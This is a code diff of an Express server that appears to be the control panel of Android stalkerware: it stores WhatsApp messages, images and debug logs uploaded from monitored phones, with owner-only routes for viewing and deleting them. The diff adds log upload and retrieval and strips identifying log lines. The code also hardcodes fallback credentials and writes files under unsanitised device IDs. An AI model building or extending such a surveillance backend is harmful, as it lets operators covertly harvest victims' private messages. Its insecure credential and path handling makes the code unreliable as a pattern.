@@ -40,7 +40,6 @@ const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'specter2024';
 const SESSION_DURATION = 7 * 24 * 60 * 60 * 1000;
 const activeSessions = new Map();
 
-// ✅ cleanup دوري للـ sessions (memory leak fix)
 setInterval(() => {
     const now = Date.now();
     let cleaned = 0;
@@ -53,9 +52,6 @@ setInterval(() => {
     if (cleaned > 0) console.log(`[AUTH] Cleaned ${cleaned} expired sessions`);
 }, 60 * 60 * 1000);
 
-// ═══════════════════════════════════════════════════════
-// 🔐 APK TOKEN
-// ═══════════════════════════════════════════════════════
 const APK_TOKEN = process.env.APK_TOKEN || 'SPECTER7';
 
 function isApkRequest(req) {
@@ -83,18 +79,14 @@ function generateToken() {
     return crypto.randomBytes(32).toString('hex');
 }
 
-// ═══════════════════════════════════════════════════════
-// 🔒 File lock for devices.json (race fix)
-// ═══════════════════════════════════════════════════════
 let devicesLock = false;
 
 // ═══════════════════════════════════════════════════════
-// SSE — ✅ محدّث مع auth
+// SSE
 // ═══════════════════════════════════════════════════════
 const sseClients = {};
 
 app.get('/events.php', (req, res) => {
-    // ✅ auth check
     const token = req.query.token || req.headers['x-auth-token'];
     const session = token ? activeSessions.get(token) : null;
 
@@ -104,12 +96,10 @@ app.get('/events.php', (req, res) => {
 
     const deviceId = req.query.device || 'all';
 
-    // ✅ غير الـ owner ما يشوف 'all'
     if (!session.isOwner && deviceId === 'all') {
         return res.status(403).send('Forbidden');
     }
 
-    // ✅ تحقق من الصلاحية على الجهاز
     if (!session.isOwner && deviceId !== 'all') {
         const perms = loadPerms();
         const allowed = perms[deviceId] || [];
@@ -135,7 +125,7 @@ app.get('/events.php', (req, res) => {
     req.on('close', () => {
         clearInterval(pingInterval);
         sseClients[deviceId] = sseClients[deviceId].filter(c => c !== res);
-        console.log(`[SSE] -client device=${deviceId} total=${sseClients[deviceId].length}`);
+        console.log(`[SSE] -client device=${deviceId}`);
     });
 });
 
@@ -146,7 +136,7 @@ function pushToDevice(deviceId, eventName, payload) {
     targets.forEach(client => {
         try { client.write(msg); sent++; } catch (e) {}
     });
-    if (sent > 0) console.log(`[SSE] >> ${eventName} to device=${deviceId} (${sent} clients)`);
+    if (sent > 0) console.log(`[SSE] >> ${eventName} to device=${deviceId}`);
 }
 
 // ═══════════════════════════════════════════════════════
@@ -161,7 +151,7 @@ app.post('/auth/login', (req, res) => {
         }
 
         if (password !== ADMIN_PASSWORD) {
-            console.log(`[AUTH] ❌ Wrong password from fp=${device.fp.slice(0, 16)}...`);
+            console.log(`[AUTH] ❌ Wrong password`);
             return res.json({ status: 'wrong_password' });
         }
 
@@ -178,12 +168,11 @@ app.post('/auth/login', (req, res) => {
                 expires: Date.now() + SESSION_DURATION, device,
                 isOwner: true
             });
-            console.log(`[AUTH] 🎉 First device = OWNER fp=${fp.slice(0, 16)}...`);
+            console.log(`[AUTH] 🎉 First device = OWNER`);
             return res.json({ status: 'approved', token, isOwner: true, first_device: true });
         }
 
         if (auth.denied.includes(fp)) {
-            console.log(`[AUTH] 🚫 Denied device fp=${fp.slice(0, 16)}...`);
             return res.json({ status: 'denied' });
         }
 
@@ -194,7 +183,6 @@ app.post('/auth/login', (req, res) => {
                 expires: Date.now() + SESSION_DURATION, device,
                 isOwner: true
             });
-            console.log(`[AUTH] ✅ Owner login fp=${fp.slice(0, 16)}...`);
             return res.json({ status: 'approved', token, isOwner: true });
         }
 
@@ -205,7 +193,6 @@ app.post('/auth/login', (req, res) => {
                 expires: Date.now() + SESSION_DURATION, device,
                 isOwner: false
             });
-            console.log(`[AUTH] ✅ User login fp=${fp.slice(0, 16)}...`);
             return res.json({ status: 'approved', token, isOwner: false });
         }
 
@@ -220,12 +207,10 @@ app.post('/auth/login', (req, res) => {
                 time: Date.now()
             });
             saveAuth(auth);
-            console.log(`[AUTH] 🆕 New device pending fp=${fp.slice(0, 16)}...`);
         }
 
         return res.json({ status: 'pending' });
     } catch (e) {
-        console.error('[AUTH] login error:', e);
         res.json({ status: 'error', message: e.message });
     }
 });
@@ -281,7 +266,7 @@ app.post('/auth/approve', (req, res) => {
             return res.status(401).json({ error: 'Unauthorized' });
         }
         if (!session.isOwner) {
-            return res.status(403).json({ error: 'Forbidden - Owner only' });
+            return res.status(403).json({ error: 'Forbidden' });
         }
 
         const auth = JSON.parse(fs.readFileSync(authFile, 'utf8'));
@@ -290,7 +275,6 @@ app.post('/auth/approve', (req, res) => {
         auth.denied = auth.denied.filter(d => d !== fp);
         saveAuth(auth);
 
-        console.log(`[AUTH] ✅ Owner approved fp=${fp.slice(0, 16)}...`);
         res.json({ success: true });
     } catch (e) {
         res.json({ error: e.message });
@@ -305,7 +289,7 @@ app.post('/auth/deny', (req, res) => {
             return res.status(401).json({ error: 'Unauthorized' });
         }
         if (!session.isOwner) {
-            return res.status(403).json({ error: 'Forbidden - Owner only' });
+            return res.status(403).json({ error: 'Forbidden' });
         }
 
         const auth = JSON.parse(fs.readFileSync(authFile, 'utf8'));
@@ -314,7 +298,6 @@ app.post('/auth/deny', (req, res) => {
         auth.approved = auth.approved.filter(a => a !== fp);
         saveAuth(auth);
 
-        console.log(`[AUTH] 🚫 Owner denied fp=${fp.slice(0, 16)}...`);
         res.json({ success: true });
     } catch (e) {
         res.json({ error: e.message });
@@ -329,7 +312,7 @@ app.post('/auth/revoke', (req, res) => {
             return res.status(401).json({ error: 'Unauthorized' });
         }
         if (!session.isOwner) {
-            return res.status(403).json({ error: 'Forbidden - Owner only' });
+            return res.status(403).json({ error: 'Forbidden' });
         }
 
         const auth = JSON.parse(fs.readFileSync(authFile, 'utf8'));
@@ -340,7 +323,6 @@ app.post('/auth/revoke', (req, res) => {
             if (s.fp === fp) activeSessions.delete(t);
         }
 
-        console.log(`[AUTH] 🔓 Owner revoked fp=${fp.slice(0, 16)}...`);
         res.json({ success: true });
     } catch (e) {
         res.json({ error: e.message });
@@ -355,7 +337,7 @@ app.post('/auth/unblock', (req, res) => {
             return res.status(401).json({ error: 'Unauthorized' });
         }
         if (!session.isOwner) {
-            return res.status(403).json({ error: 'Forbidden - Owner only' });
+            return res.status(403).json({ error: 'Forbidden' });
         }
 
         const auth = JSON.parse(fs.readFileSync(authFile, 'utf8'));
@@ -379,7 +361,7 @@ app.get('/auth/permissions', (req, res) => {
             return res.status(401).json({ error: 'Unauthorized' });
         }
         if (!session.isOwner) {
-            return res.status(403).json({ error: 'Forbidden - Owner only' });
+            return res.status(403).json({ error: 'Forbidden' });
         }
         res.json(loadPerms());
     } catch (e) {
@@ -395,7 +377,7 @@ app.post('/auth/grant-device', (req, res) => {
             return res.status(401).json({ error: 'Unauthorized' });
         }
         if (!session.isOwner) {
-            return res.status(403).json({ error: 'Forbidden - Owner only' });
+            return res.status(403).json({ error: 'Forbidden' });
         }
 
         const perms = loadPerms();
@@ -403,7 +385,6 @@ app.post('/auth/grant-device', (req, res) => {
         if (!perms[deviceId].includes(fp)) perms[deviceId].push(fp);
         savePerms(perms);
 
-        console.log(`[PERMS] ✅ Granted device=${deviceId} to fp=${fp.slice(0, 16)}...`);
         res.json({ success: true });
     } catch (e) {
         res.json({ error: e.message });
@@ -418,7 +399,7 @@ app.post('/auth/revoke-device', (req, res) => {
             return res.status(401).json({ error: 'Unauthorized' });
         }
         if (!session.isOwner) {
-            return res.status(403).json({ error: 'Forbidden - Owner only' });
+            return res.status(403).json({ error: 'Forbidden' });
         }
 
         const perms = loadPerms();
@@ -427,7 +408,6 @@ app.post('/auth/revoke-device', (req, res) => {
         }
         savePerms(perms);
 
-        console.log(`[PERMS] 🔓 Revoked device=${deviceId} from fp=${fp.slice(0, 16)}...`);
         res.json({ success: true });
     } catch (e) {
         res.json({ error: e.message });
@@ -444,6 +424,20 @@ app.post('/upload.php', (req, res) => {
         }
 
         const data = req.body;
+
+        // ✅ NEW: debug_logs handler
+        if (data.type === 'debug_logs') {
+            const deviceId = data.device_id || 'unknown';
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+
+            const logFile = path.join(deviceDir, 'debug.log');
+            fs.writeFileSync(logFile, data.logs || '');
+            updateDevicesList(deviceId, null);
+
+            console.log(`[LOGS] ${(data.logs || '').length} bytes from ${deviceId}`);
+            return res.json({ success: true });
+        }
 
         if (data.type === 'image_data' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
@@ -973,13 +967,22 @@ app.get('/api.php', (req, res) => {
             return res.json({ reset: false });
         }
 
+        // ✅ NEW: get_logs
+        if (action === 'get_logs') {
+            const logFile = path.join(dataDir, deviceId, 'debug.log');
+            if (fs.existsSync(logFile)) {
+                res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+                return res.send(fs.readFileSync(logFile, 'utf8'));
+            }
+            return res.send('No logs yet');
+        }
+
         if (action === 'get_image_data') {
             const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
             if (fs.existsSync(imagesFile)) return res.json(JSON.parse(fs.readFileSync(imagesFile, 'utf8')));
             return res.json([]);
         }
 
-        // ✅ حذف دردشة كاملة
         if (action === 'delete_whatsapp_chat') {
             const sender = req.query.sender;
             const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
@@ -992,7 +995,6 @@ app.get('/api.php', (req, res) => {
             return res.json({ success: false });
         }
 
-        // ✅ NEW: حذف رسائل محددة بالـ timestamp
         if (action === 'delete_whatsapp') {
             const timestamps = (req.query.timestamps || '').split(',').map(t => t.trim()).filter(t => t);
             const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
@@ -1001,7 +1003,6 @@ app.get('/api.php', (req, res) => {
                 const before = messages.length;
                 messages = messages.filter(m => !timestamps.includes(String(m.timestamp)));
                 fs.writeFileSync(waFile, JSON.stringify(messages, null, 2));
-                console.log(`[WA] Deleted ${before - messages.length} messages for device=${deviceId}`);
                 return res.json({ success: true, deleted: before - messages.length });
             }
             return res.json({ success: false });
@@ -1013,12 +1014,10 @@ app.get('/api.php', (req, res) => {
             return res.json([]);
         }
 
-        // ✅ مسح كل رسائل واتساب
         if (action === 'clear_whatsapp') {
             const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
             if (fs.existsSync(waFile)) {
                 fs.writeFileSync(waFile, '[]');
-                console.log(`[CLEAR] WhatsApp cleared for device=${deviceId}`);
                 return res.json({ success: true });
             }
             const deviceDir = path.join(dataDir, deviceId);
@@ -1225,7 +1224,6 @@ app.get('/devices.json', (req, res) => {
     }
 });
 
-// ✅ محدّث: lock لمنع race
 function updateDevicesList(deviceId, deviceInfo) {
     while (devicesLock) { /* spin */ }
     devicesLock = true;
